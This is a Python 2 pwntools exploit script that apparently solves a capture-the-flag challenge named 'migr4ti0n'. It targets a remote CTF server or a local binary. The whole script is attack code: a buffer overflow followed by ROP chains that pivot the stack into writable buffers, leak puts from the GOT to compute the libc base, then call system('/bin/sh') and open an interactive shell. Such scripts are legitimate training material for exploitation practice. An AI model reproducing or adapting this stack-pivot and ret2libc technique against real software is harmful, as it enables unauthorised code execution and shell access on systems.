import pwn
import pwnlib
import time

read_plt_address = 0x00000000004004e0
puts_plt_address = 0x00000000004004d8
puts_got_address = 0x0000000000600fd8

buf1_address = 0x0000000000601000 + 0x300
buf2_address = 0x0000000000601000 + 0x600

pwn.context.arch = 'amd64'

def ropchain_1():
    c = ''

    # rbp
    c += pwn.pack(buf1_address) # rbp = buf1_address

    # migrate to buf1
    c += pwn.pack(0x00000000004006b3) # pop rdi
    c += pwn.pack(0) # 0
    c += pwn.pack(0x00000000004006b1) # pop rsi; pop r15
    c += pwn.pack(buf1_address)
    c += 'A'*8 # padding
    c += pwn.pack(0x00000000004006d4) # pop rdx
    c += pwn.pack(0x200)
    c += pwn.pack(read_plt_address) # read@plt

    c += pwn.pack(0x000000000040064a) # leave; ret

    return c

def ropchain_2():

    c = ''

    c += pwn.pack(buf2_address) # rbp = buf2_address

    # leak puts
    c += pwn.pack(0x00000000004006b3) # pop rdi
    c += pwn.pack(puts_got_address) # puts@got
    c += pwn.pack(puts_plt_address) # puts@plt

    # migrate to buf2
    c += pwn.pack(0x00000000004006b3) # pop rdi
    c += pwn.pack(0) # 0
    c += pwn.pack(0x00000000004006b1) # pop rsi; pop r15
    c += pwn.pack(buf2_address)
    c += 'A'*8 # padding
    c += pwn.pack(read_plt_address) # read@plt

    c += pwn.pack(0x000000000040064a) # leave; ret

    return c

def ropchain_3(system_address):

    c = ''
    c += pwn.pack(buf2_address) # rbp = buf2_address
    c += pwn.pack(0x00000000004006b3) # pop rdi
    c += pwn.pack(buf2_address + 32) # */bin/sh
    c += pwn.pack(system_address)
    c += '/bin/sh\x00'

    return c

if __name__ == '__main__':
    if pwnlib.args.args['REMOTE']:
        p = pwn.connect('csie.ctf.tw', 10132)
    else:
        p = pwn.process('./migr4ti0n-5b1ebb81d74911197f610391688c934210d79274')

    libc = pwn.ELF('./libc.so.6-14c22be9aa11316f89909e4237314e009da38883')

    payload1 = 'a'*48 + ropchain_1()

    pwn.gdb.attach(p, gdbscript='b *0x40064a') # + str(hex(buf1_address)))

    p.send(payload1)
    p.sendline(ropchain_2())

    print p.recvline() # try your best
    puts_got = p.recvline()
    puts_got = pwn.u64(puts_got[:-1].ljust(8, '\x00'))
    print hex(puts_got)

    lib_base = puts_got - libc.symbols['puts']
    system_got = lib_base + libc.symbols['system']

    print hex(system_got)

    # p.sendline(pwn.pack(buf1_address) + 'abcdefg')
    p.send(ropchain_3(system_got)) # 2nd ropchain

    p.interactive()
